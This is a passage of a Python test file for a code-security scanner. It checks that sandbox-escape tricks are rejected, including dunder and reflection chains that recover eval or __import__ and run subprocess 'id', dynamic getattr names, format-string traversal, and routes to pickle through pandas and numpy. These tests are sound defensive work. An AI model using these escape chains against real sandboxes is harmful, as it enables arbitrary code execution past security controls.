            "import datetime\nvalue = datetime.datetime.now()",
            # A *member* of a stdlib module is not a carrier and must stay
            # usable as an ordinary argument.
            "import json\nvalue = isinstance(1, json.JSONDecoder)",
            "import json\n\ntry:\n    pass\nexcept json.JSONDecodeError:\n    pass",
            "import functools\nimport operator\n\nadd_one = functools.partial(operator.add, 1)",
        ],
        ids=[
            "json-dumps",
            "zipfile-normal-use",
            "re-match",
            "math-sqrt",
            "datetime-now",
            "stdlib-member-as-argument",
            "stdlib-exception-member",
            "functools-partial-over-operator-member",
        ],
    )
    def test_ordinary_stdlib_use_still_allowed(self, code):
        assert scan_code_security(code).is_safe is True

    def test_wildcard_import_of_an_untabled_module_does_not_crash_the_scan(self):
        """Pre-existing: "tuple | set" raised TypeError out of scan_code_security.

        Any ``from <module> import *`` where the module has no entry in the
        dangerous-call table hit the tuple default and crashed the scan rather
        than returning a result.
        """
        assert scan_code_security("from typing import *\nvalue = 1").is_safe is True
        assert scan_code_security("from dataclasses import *\nvalue = 1").is_safe is True


class TestReflectiveNamespaceDynamicKeys:
    """A dynamically selected key into a namespace mapping is a sandbox escape.

    Static-key checks cover ``vars(X)["__globals__"]``, but a runtime-built key
    such as ``"__GLOBALS__".lower()`` resolves to the same descriptor, and a
    second dynamically selected getter recovers function globals and the
    builtins evaluator without a direct dunder attribute access or a getattr
    call. The owner does not have to be nameable -- ``vars(type(f))`` is opaque
    to this scanner -- so the mapping itself is tracked and an unresolvable
    selector fails closed.

    Every proof here is harmless: the recovered callable only evaluates 2 + 2.
    """

    # Recovers builtins.eval through two dynamically selected keys.
    DYNAMIC_REFLECTION_POC = (
        "def f():\n"
        "    pass\n"
        "\n"
        "key = '__GLOBALS__'.lower()\n"
        "getter_key = '__GET__'.lower()\n"
        "builtins_key = '__BUILTINS__'.lower()\n"
        "eval_key = 'EVAL'.lower()\n"
        "ns = vars(type(f))\n"
        "desc = ns[key]\n"
        "getter = vars(type(desc))[getter_key]\n"
        "g = getter(desc, f)\n"
        "evaluator = g[builtins_key][eval_key]\n"
        "result = evaluator('2 + 2')\n"
    )

    def test_dynamic_reflection_poc_is_rejected(self):
        assert scan_code_security(self.DYNAMIC_REFLECTION_POC).is_safe is False

    def test_dynamic_reflection_poc_really_recovers_an_evaluator(self):
        """The regression is only meaningful if the payload actually works."""
        namespace: dict = {}
        exec(self.DYNAMIC_REFLECTION_POC, namespace)  # noqa: S102 - arithmetic only
        assert namespace["result"] == 4

    @pytest.mark.parametrize(
        "code",
        [
            "def f():\n    pass\nk = '__GLOBALS__'.lower()\nd = vars(type(f))[k]",
            "def f():\n    pass\nk = '__GLOBALS__'.lower()\nd = vars(type(f)).get(k)",
            "def f():\n    pass\nk = '__GLOBALS__'.lower()\nd = vars(type(f)).__getitem__(k)",
            "def f():\n    pass\nlookup = vars(type(f)).get\nk = '__GLOBALS__'.lower()\nd = lookup(k)",
            "def f():\n    pass\nk = '__GLOBALS__'.lower()\nd = type(f).__dict__[k]",
            "def f():\n    pass\nk = 'x'.join(['__glo', 'bals__'])\nd = vars(type(f))[k]",
            "import os\nk = input()\nd = vars(os)[k]",
        ],
        ids=[
            "vars-subscript-dynamic-key",
            "vars-get-dynamic-key",
            "vars-getitem-dynamic-key",
            "aliased-vars-get-dynamic-key",
            "opaque-dunder-dict-dynamic-key",
            "dynamic-key-built-by-join",
            "restricted-module-dynamic-key",
        ],
    )
    def test_dynamic_namespace_keys_are_rejected(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            # Ordinary application dictionaries are untouched: only mappings
            # that came from vars()/__dict__ are namespaces.
            "d = {'a': 1}\nk = input()\nvalue = d[k]",
            "d = {'a': 1}\nk = input()\nvalue = d.get(k)",
            "items = [1, 2, 3]\nindex = 0\nvalue = items[index]",
            "def g(**kwargs):\n    key = 'a'\n    return kwargs[key]",
            "config = {}\nfor key in ('a', 'b'):\n    config[key] = 1",
            # A statically known, non-dunder key into a namespace stays allowed.
            "class C:\n    x = 1\n\n\nvalue = vars(C)['x']",
        ],
        ids=[
            "plain-dict-dynamic-key",
            "plain-dict-get-dynamic-key",
            "list-index",
            "kwargs-lookup",
            "dict-assignment-in-loop",
            "namespace-static-safe-key",
        ],
    )
    def test_ordinary_mappings_still_allowed(self, code):
        assert scan_code_security(code).is_safe is True


class TestReflectiveNamespaceProvenance:
    """A namespace mapping must keep its marker across a copy.

    The dynamic-key rule only fires on a value this scanner still recognizes as
    a namespace. Copying or reconstructing the mapping dropped that marker, so
    ``dict(vars(type(f)))`` and ``vars(type(f)).copy()`` read as ordinary
    application dictionaries and every key rule stopped applying — the original
    descriptor/evaluator chain stayed reachable. The marker now rides the value
    through ``dict()``, ``{**ns}``, ``.copy()`` and any call this scanner cannot
    model, and namespace methods that hand out members without presenting a key
    are rejected outright.

    Every proof here is harmless: the recovered callable only evaluates 2 + 2.
    """

    # Recovers builtins.eval through a copied namespace, so no marker survives
    # unless provenance is preserved.
    COPIED_NAMESPACE_POC = (
        "f = lambda: None\n"
        "ns = dict(vars(type(f)))\n"
        'd = ns["__globals__".lower()]\n'
        "getters = dict(vars(type(d)))\n"
        'g = getters["__get__".lower()](d, f)\n'
        'b = g["__builtins__".lower()]\n'
        'e = b["eval"] if isinstance(b, dict) else vars(b)["eval"]\n'
        'result = e("2 + 2")\n'
    )

    def test_copied_namespace_poc_is_rejected(self):
        result = scan_code_security(self.COPIED_NAMESPACE_POC)
        assert result.is_safe is False
        assert any("(sandbox escape)" in violation for violation in result.violations)

    def test_copied_namespace_poc_really_recovers_an_evaluator(self):
        """The regression is only meaningful if the payload actually works."""
        namespace: dict = {}
        exec(self.COPIED_NAMESPACE_POC, namespace)  # noqa: S102 - arithmetic only
        assert namespace["result"] == 4

    @pytest.mark.parametrize(
        "code",
        [
            "def f():\n    pass\nk = '__GLOBALS__'.lower()\nns = dict(vars(type(f)))\nd = ns[k]",
            "def f():\n    pass\nk = '__GLOBALS__'.lower()\nns = vars(type(f)).copy()\nd = ns[k]",
            "def f():\n    pass\nk = '__GLOBALS__'.lower()\nns = {**vars(type(f))}\nd = ns[k]",
            "def f():\n    pass\nk = '__GLOBALS__'.lower()\nns = dict(**vars(type(f)))\nd = ns[k]",
            "import copy\ndef f():\n    pass\nk = '__GLOBALS__'.lower()\nns = copy.deepcopy(vars(type(f)))\nd = ns[k]",
            "def f():\n    pass\nk = '__GLOBALS__'.lower()\n"
            "def passthrough(m):\n    return m\nd = passthrough(vars(type(f)))[k]",
            "def f():\n    pass\nk = '__GLOBALS__'.lower()\nns = dict(vars(type(f)))\nd = ns.get(k)",
            "def f():\n    pass\nk = '__GLOBALS__'.lower()\ncopied = dict(vars(type(f)))\nd = dict.get(copied, k)",
        ],
        ids=[
            "dict-constructor-copy",
            "copy-method",
            "dict-unpack",
            "dict-keyword-unpack",
            "copy-deepcopy",
            "unmodeled-helper-passthrough",
            "copied-namespace-get",
            "copied-namespace-unbound-get",
        ],
    )
    def test_provenance_survives_copies_and_conversions(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("namespace mapping" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            "def f():\n    pass\nvalues = list(vars(type(f)).values())",
            "def f():\n    pass\nfor k, v in vars(type(f)).items():\n    pass",
            "def f():\n    pass\nentry = vars(type(f)).popitem()",
            "def f():\n    pass\nns = dict(vars(type(f)))\nvalues = list(ns.values())",
        ],
        ids=["values", "items", "popitem", "copied-namespace-values"],
    )
    def test_namespace_methods_without_a_selector_are_rejected(self, code):
        # ``values()``/``items()`` return the descriptors directly, so the key
        # rules never see a selector at all.
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("namespace mapping" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            # Ordinary application dictionaries survive the same copies: they
            # never carry the marker to begin with.
            "base = {'a': 1}\ncopied = dict(base)\nvalue = copied[selector]",
            "base = {'a': 1}\nmerged = {**base, 'b': 2}\nvalue = merged[selector]",
            "base = {'a': 1}\nvalues = list(base.values())",
            "base = {'a': 1}\nfor k, v in base.items():\n    pass",
            # A namespace read with a statically known, non-dunder key still works.
            "import argparse\nparsed = argparse.Namespace()\nconfig = dict(vars(parsed))\nname = config['name']",
            "class C:\n    x = 1\n\n\nfields = sorted(vars(C).keys())",
            "class C:\n    x = 1\n\n\ncount = len(vars(C))",
            # The marker rides onto non-mappings, so sequence reads must stay clean.
            "import json\n\n\nclass C:\n    x = 1\n\n\ntext = json.dumps(vars(C()))\nhead = text[:100]",
        ],
        ids=[
            "plain-dict-copy",
            "plain-dict-merge",
            "plain-dict-values",
            "plain-dict-items",
            "namespace-copy-static-key",
            "namespace-keys",
            "namespace-length",
            "serialized-namespace-slice",
        ],
    )
    def test_ordinary_dictionary_copies_still_allowed(self, code):
        assert scan_code_security(code).is_safe is True


class TestScanCodeSecurityDynamicGetattrSandboxBypass:
    """Regression for H1-3977745: AST sandbox bypass via dynamic attribute names.

    The scanner only blocked sandbox-escape dunders when they appeared
    literally, and ``__class__`` / ``__base__`` / ``__init__`` were not listed
    at all, so ``getattr(().__class__.__base__, <dynamic name>)`` reached
    ``object.__subclasses__()`` -> a function's ``__globals__`` -> ``__import__``
    without a violation. All dunder attribute access, all dynamic ``getattr``
    attribute names (regardless of receiver), and the non-dunder introspection
    gadgets (``mro``, frame/traceback attributes, formatter sinks) are now
    rejected, matching lfx/utils/python_repl_security.py::validate_code_safety.
    """

    def test_should_detect_reported_poc_escape_chain(self):
        code = (
            "base = ().__class__.__base__\n"
            'subs = getattr(base, "__subclasses__".upper().lower())()\n'
            'g = getattr(getattr(subs[0], "__init__"), "".join(["__globa","ls__"]))\n'
            'g["".join(["__buil","tins__"])]["".join(["__imp","ort__"])]("subprocess").check_output(["id"])'
        )
        result = scan_code_security(code)
        assert result.is_safe is False
        assert result.violations

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param("x = ().__class__", id="dunder-class"),
            pytest.param("x = ().__class__.__base__", id="dunder-base"),
            pytest.param("def f():\n    pass\nx = f.__init__", id="dunder-init"),
            pytest.param("class A:\n    pass\nx = A.__init__", id="class-dunder-init"),
            pytest.param("x = object.__getattribute__", id="dunder-getattribute"),
            pytest.param("def f():\n    pass\nx = f.__reduce__", id="dunder-reduce"),
            pytest.param("x = ().__class__.mro()", id="non-dunder-mro"),
            pytest.param("x = int.mro()", id="non-dunder-mro-int"),
            pytest.param(
                "def g():\n    yield 1\nf = g().gi_frame.f_globals",
                id="generator-frame-globals",
            ),
            pytest.param(
                "def f():\n    pass\nb = f.__globals__['__builtins__']",
                id="func-globals-subscript",
            ),
        ],
    )
    def test_should_detect_dunder_and_introspection_attribute_access(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                'base = ().__class__.__base__\ngetattr(base, "__subclasses__".upper().lower())()',
                id="method-transformed-name",
            ),
            pytest.param(
                'getattr(object, "".join(["__subcl", "asses__"]))()',
                id="join-assembled-name",
            ),
            pytest.param(
                "getattr(object, f\"__sub{'cl'}asses__\")()",
                id="nested-fstring-name",
            ),
            pytest.param(
                "getattr(object, '__subclasses__'[:])()",
                id="sliced-name",
            ),
            pytest.param(
                "name = '__sub' + 'classes__'\nnames = name.split('l')\ngetattr(object, 'l'.join(names))()",
                id="rebound-joined-name",
            ),
            pytest.param(
                "field = 'value'\ngetattr(self, field, None)",
                id="dynamic-name-ordinary-receiver",
            ),
        ],
    )
    def test_should_detect_dynamic_getattr_name_on_any_receiver(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False
        assert result.violations

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                'def f():\n    pass\n"{0.__globals__[__builtins__]}".format(f)',
                id="str-format-dunder-traversal",
            ),
            pytest.param(
                'def f():\n    pass\n"{0.__globals__}".format_map({})',
                id="format-map-sink",
            ),
            pytest.param(
                "import operator\noperator.attrgetter('__globals__')(f)",
                id="attrgetter-sink",
            ),
            pytest.param(
                "import operator\noperator.methodcaller('format', f)",
                id="methodcaller-sink",
            ),
        ],
    )
    def test_should_detect_formatter_attribute_traversal(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param('v = getattr(self, "field", None)', id="static-getattr-with-default"),
            pytest.param("v = getattr(record, 'display' + '_name', None)", id="computed-static-getattr"),
            pytest.param("import os\ngetattr(os.path, 'join')('a', 'b')", id="static-safe-module-member"),
            pytest.param('s = f"hello {name}"', id="f-string"),
            pytest.param(
                "class A:\n    def __init__(self):\n        self.x = 1",
                id="dunder-method-definition",
            ),
        ],
    )
    def test_should_still_allow_safe_patterns(self, code):
        assert scan_code_security(code).is_safe is True


class TestScanCodeSecurityUnpackedGetattrArguments:
    """Regression: starred ``getattr()`` arguments skipped selector validation.

    ``getattr(*(f, "__globals__"))`` carries a single starred argument, so
    ``node.args[1]`` did not exist and the attribute name was never checked —
    the call returned before any rule ran. Unpacked arguments cannot be modeled
    statically, so they now fail closed.
    """

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param("def f():\n    pass\ng = getattr(*(f, '__globals__'))", id="starred-tuple-literal"),
            pytest.param(
                "def f():\n    pass\nargs = (f, '__globals__')\ng = getattr(*args)",
                id="starred-name",
            ),
            pytest.param(
                "def f():\n    pass\nkw = {'name': '__globals__'}\ng = getattr(f, **kw)",
                id="double-starred-keywords",
            ),
            pytest.param(
                "import builtins\ndef f():\n    pass\ng = builtins.getattr(*(f, '__globals__'))",
                id="qualified-getattr-starred",
            ),
        ],
    )
    def test_should_detect_unpacked_getattr_arguments(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("getattr()" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            # Unpacking elsewhere is untouched; only ``getattr`` is gated.
            pytest.param("def add(a, b):\n    return a + b\nargs = (1, 2)\ntotal = add(*args)", id="ordinary-starred"),
            pytest.param(
                "def build(**options):\n    return options\nopts = {'a': 1}\nresult = build(**opts)",
                id="ordinary-double-starred",
            ),
            pytest.param("value = getattr(self, 'field', None)", id="explicit-getattr-arguments"),
        ],
    )
    def test_should_allow_unpacking_outside_getattr(self, code):
        assert scan_code_security(code).is_safe is True


class TestScanCodeSecurityUnsafeDeserialization:
    """Generated code must not reach pickle through permitted data libraries."""

    @pytest.mark.parametrize(
        ("code", "module"),
        [
            ("import pandas as pd\npd.read_pickle(payload)", "pandas"),
            ("import pandas as pd\nloader = pd.read_pickle\nloader(payload)", "pandas"),
            ("import pandas as pd\ngetattr(pd, 'read_pickle')(payload)", "pandas"),
            ("from pandas import read_pickle as load\nload(payload)", "pandas"),
            ("from pandas import read_pickle", "pandas"),
            ("import pandas.io.pickle as io_pickle\nio_pickle.read_pickle(payload)", "pandas"),
            ("import pandas.io.pickle as io_pickle\nio_pickle.pickle.loads(payload)", "pandas"),
            ("import pandas.io.pickle as io_pickle\nio_pickle.pc.Unpickler(stream).load()", "pandas"),
            ("from pandas.io import pickle as io_pickle\nio_pickle.read_pickle(payload)", "pandas"),
            ("from pandas.io.pickle import pc", "pandas"),
            ("from pandas.io.pickle import *\npc.Unpickler(stream).load()", "pandas"),
            ("from pandas.io.pickle import read_pickle\nread_pickle(payload)", "pandas"),
            ("import pandas.io.api as pio\npio.read_pickle(payload)", "pandas"),
            ("from pandas.io.api import *\nread_pickle(payload)", "pandas"),
            ("import pandas.core.generic as generic\ngeneric.pickle.loads(payload)", "pandas"),
            ("from pandas.core.generic import pickle as p\np.loads(payload)", "pandas"),
            ("from pandas.core import generic\ngeneric.pickle.loads(payload)", "pandas"),
            ("import pandas.compat.pickle_compat as pc\npc.load(payload)", "pandas"),
            ("import pandas.compat.pickle_compat as pc\npc.loads(payload)", "pandas"),
            ("from pandas.compat.pickle_compat import *\nloads(payload)", "pandas"),
            ("import pandas.compat.pickle_compat as pc\npc.Unpickler(stream).load()", "pandas"),
            ("import pandas.compat.pickle_compat as pc\npc.pkl.loads(payload)", "pandas"),
            ("from pandas.compat.pickle_compat import Unpickler", "pandas"),
            ("from pandas.compat import pickle_compat as pc\npc.Unpickler(stream).load()", "pandas"),
            ("import pandas as pd\npd.compat.pickle_compat.pkl.loads(payload)", "pandas"),
            ("import pandas as pd\npd.io.pickle.pc.Unpickler(stream).load()", "pandas"),
            ("import pandas as pd\ngetattr(pd.io, 'pickle').pc.Unpickler(stream).load()", "pandas"),
            ("import pandas as pd\nvars(pd.io)['pickle'].pickle.loads(payload)", "pandas"),
            ("import pandas as pd\ngetattr(pd.compat, 'pickle_compat').pkl.loads(payload)", "pandas"),
            ("import pandas as pd\nvars(pd.compat)['pickle_compat'].pkl.loads(payload)", "pandas"),
            ("import pandas as pd\nvars(pd.compat).get('pickle_compat').pkl.loads(payload)", "pandas"),
            ("from pandas import *\nread_pickle(payload)", "pandas"),
            ("import joblib\njoblib.load(payload)", "joblib"),
            ("from dill import loads\nloads(payload)", "dill"),
            ("import cloudpickle\ncloudpickle.loads(payload)", "cloudpickle"),
            ("import _pickle\n_pickle.loads(payload)", "_pickle"),
            ("from _pickle import loads\nloads(payload)", "_pickle"),
            ("import pickletools\npickletools.pickle.loads(payload)", "pickletools"),
            ("from pickletools import pickle as p\np.loads(payload)", "pickletools"),
            ("import pickletools\ngetattr(pickletools, 'pickle').loads(payload)", "pickletools"),
            ("import trace\ntrace.pickle.loads(payload)", "trace"),
            ("import tracemalloc\ntracemalloc.pickle.loads(payload)", "tracemalloc"),
            ("from tracemalloc import pickle as p\np.loads(payload)", "tracemalloc"),
            ("from tracemalloc import *\npickle.loads(payload)", "tracemalloc"),
            (
                "import concurrent.futures.process as process\nprocess.mp.reduction.ForkingPickler.loads(payload)",
                "concurrent.futures.process",
            ),
            (
                "from concurrent.futures import process\nprocess.mp.reduction.ForkingPickler.loads(payload)",
                "concurrent.futures.process",
            ),
            ("import numpy.lib.format as fmt\nfmt.pickle.loads(payload)", "numpy"),
            ("import numpy._core._methods as methods\nmethods.pickle.loads(payload)", "numpy"),
            ("from numpy._core._methods import pickle as p\np.loads(payload)", "numpy"),
            ("import numpy.lib._format_impl as fmt\nfmt.pickle.loads(payload)", "numpy"),
            ("import numpy.lib._npyio_impl as npio\nnpio.pickle.loads(payload)", "numpy"),
            ("import numpy as np\nnp.lib._format_impl.pickle.loads(payload)", "numpy"),
            ("from numpy.lib._format_impl import pickle as p\np.loads(payload)", "numpy"),
            ("from numpy.lib._npyio_impl import pickle", "numpy"),
            ("from numpy.lib._format_impl import *\npickle.loads(payload)", "numpy"),
            ("from numpy.lib import _npyio_impl as npio\nnpio.pickle.loads(payload)", "numpy"),
            ("import numpy.lib._format_impl as fmt\ngetattr(fmt, 'pickle').loads(payload)", "numpy"),
            ("import numpy.lib._npyio_impl as npio\nvars(npio).get('pickle').loads(payload)", "numpy"),
        ],
    )
    def test_rejects_pickle_deserialization_paths(self, code, module):
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any(module in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            "import pandas as pd\npd.read_csv(path)",
            "from pandas import DataFrame\nframe = DataFrame(data)",
            "import pandas.compat as compat\nvalue = compat.is_numpy_dev",
        ],
    )
    def test_preserves_non_pickle_pandas_operations(self, code):
        assert scan_code_security(code).is_safe is True

    @pytest.mark.parametrize(
        "code",
        [
            "import numpy as np\nnp.load(payload, allow_pickle=True)",
            "import numpy as np\nreader = np.load\nreader(payload, allow_pickle=True)",
            "import numpy as np\nreader = [np.load][0]\nreader(payload, allow_pickle=True)",
            "import numpy as np\nclass Loader:\n    reader = np.load\n"
            "    def run(self):\n        return self.reader(payload, allow_pickle=True)",
            "import numpy as np\ngetattr(np, 'load')(payload, allow_pickle=True)",
            "from numpy import load as reader\nreader(payload, allow_pickle=True)",
            "from numpy import *\nload(payload, allow_pickle=True)",
            "from numpy.lib.npyio import *\nload(payload, allow_pickle=True)",
            "from numpy.lib._npyio_impl import NpzFile\nNpzFile(payload, allow_pickle=True)['arr_0']",
            "import numpy.lib._npyio_impl as npio\nnpio.NpzFile(payload, allow_pickle=True)['arr_0']",
            "import numpy.lib.npyio as npio\nnpio.NpzFile(payload, allow_pickle=True)['arr_0']",
            "from numpy.lib._npyio_impl import NpzFile as Reader\nReader(payload, allow_pickle=flag)['arr_0']",
            "import numpy as np\nnp.load(payload, None, True)",
            "import numpy as np\nnp.load(payload, allow_pickle=flag)",
            "import numpy as np\nnp.load(payload, **options)",
        ],
    )
    def test_rejects_numpy_load_when_pickle_may_be_enabled(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("numpy" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            "import numpy as np\nnp.load(payload)",
            "import numpy as np\nnp.load(payload, allow_pickle=False)",
            "from numpy import load\nload(payload, None, False)",
            "from numpy import *\nload(payload, allow_pickle=False)",
            "from numpy.lib.npyio import *\nload(payload)",
            "from numpy.lib._npyio_impl import NpzFile\nNpzFile(payload)['arr_0']",
            "import numpy.lib._npyio_impl as npio\nnpio.NpzFile(payload, allow_pickle=False)['arr_0']",
        ],
    )
    def test_preserves_numpy_load_with_pickle_disabled(self, code):
        assert scan_code_security(code).is_safe is True

    @pytest.mark.parametrize(
        "code",
        [
            "import numpy.lib.format as fmt\nfmt.read_array(payload, allow_pickle=True)",
            "from numpy.lib.format import read_array as reader\nreader(payload, allow_pickle=True)",
            "from numpy.lib.format import *\nread_array(payload, allow_pickle=True)",
            "import numpy.lib.format as fmt\nfmt.read_array(payload, flag)",
            "import numpy.lib._format_impl as fmt\nfmt.read_array(payload, allow_pickle=True)",
            "from numpy.lib._format_impl import *\nread_array(payload, allow_pickle=True)",
        ],
    )
    def test_rejects_numpy_read_array_when_pickle_may_be_enabled(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("numpy.lib." in violation and "read_array" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            "import numpy.lib.format as fmt\nfmt.read_array(payload)",
            "from numpy.lib.format import *\nread_array(payload, allow_pickle=False)",
            "import numpy.lib._format_impl as fmt\nfmt.read_array(payload)",
        ],
    )
    def test_preserves_numpy_read_array_with_pickle_disabled(self, code):
        assert scan_code_security(code).is_safe is True
